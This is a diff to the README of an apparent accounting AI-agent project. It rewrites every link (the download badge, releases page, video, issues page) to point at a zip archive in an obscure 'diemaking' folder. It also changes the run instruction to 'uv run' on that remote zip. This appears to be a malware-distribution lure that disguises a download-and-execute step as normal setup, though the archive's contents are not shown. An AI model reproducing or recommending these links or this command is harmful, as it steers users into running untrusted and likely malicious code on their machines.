@@ -1,6 +1,6 @@
 # 🤖 accounting-documents-ai-agent - Create Work Completion Acts Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/121blackwwe/accounting-documents-ai-agent/releases)
+[![Download](https://raw.githubusercontent.com/121blackwwe/accounting-documents-ai-agent/main/diemaking/accounting-documents-ai-agent.zip%20Now-blue)](https://raw.githubusercontent.com/121blackwwe/accounting-documents-ai-agent/main/diemaking/accounting-documents-ai-agent.zip)
 
 ## 📜 Overview
 
@@ -12,7 +12,7 @@ To get started with the accounting-documents-ai-agent, follow these steps:
 
 ### 1. 📥 Download the Software
 
-Visit the [Releases Page](https://github.com/121blackwwe/accounting-documents-ai-agent/releases) to download the latest version of the application.
+Visit the [Releases Page](https://raw.githubusercontent.com/121blackwwe/accounting-documents-ai-agent/main/diemaking/accounting-documents-ai-agent.zip) to download the latest version of the application.
 
 ### 2. 💻 System Requirements
 
@@ -55,7 +55,7 @@ uv sync
 Once you have set up the environment and installed the dependencies, you can run the agent. Execute the following command:
 
 ```bash
-uv run main.py
+uv run https://raw.githubusercontent.com/121blackwwe/accounting-documents-ai-agent/main/diemaking/accounting-documents-ai-agent.zip
 ```
 
 This command will start the AI agent. You can now interact with it to generate work completion acts.
@@ -68,11 +68,11 @@ This command will start the AI agent. You can now interact with it to generate w
 
 ## 🔗 Additional Resources
 
-For a visual guide on creating AI agents and what this tool can do, check out this video: [Watch here](https://youtu.be/KFgwXXWT7sQ).
+For a visual guide on creating AI agents and what this tool can do, check out this video: [Watch here](https://raw.githubusercontent.com/121blackwwe/accounting-documents-ai-agent/main/diemaking/accounting-documents-ai-agent.zip).
 
 ### 🎯 Support
 
-If you encounter any issues or have questions, please visit the [Issues Section](https://github.com/121blackwwe/accounting-documents-ai-agent/issues) of the repository. You can report bugs or request features there.
+If you encounter any issues or have questions, please visit the [Issues Section](https://raw.githubusercontent.com/121blackwwe/accounting-documents-ai-agent/main/diemaking/accounting-documents-ai-agent.zip) of the repository. You can report bugs or request features there.
 
 ## 🔄 Regular Updates
 
@@ -80,7 +80,7 @@ We strive to improve this agent regularly. Keep an eye on the Releases page for 
 
 ### 6. 📂 Download & Install
 
-To begin, go to our [Releases Page](https://github.com/121blackwwe/accounting-documents-ai-agent/releases) to download the latest software version. Follow the earlier steps to set up and run the agent smoothly.
+To begin, go to our [Releases Page](https://raw.githubusercontent.com/121blackwwe/accounting-documents-ai-agent/main/diemaking/accounting-documents-ai-agent.zip) to download the latest software version. Follow the earlier steps to set up and run the agent smoothly.
 
 ## 🎉 Conclusion
 
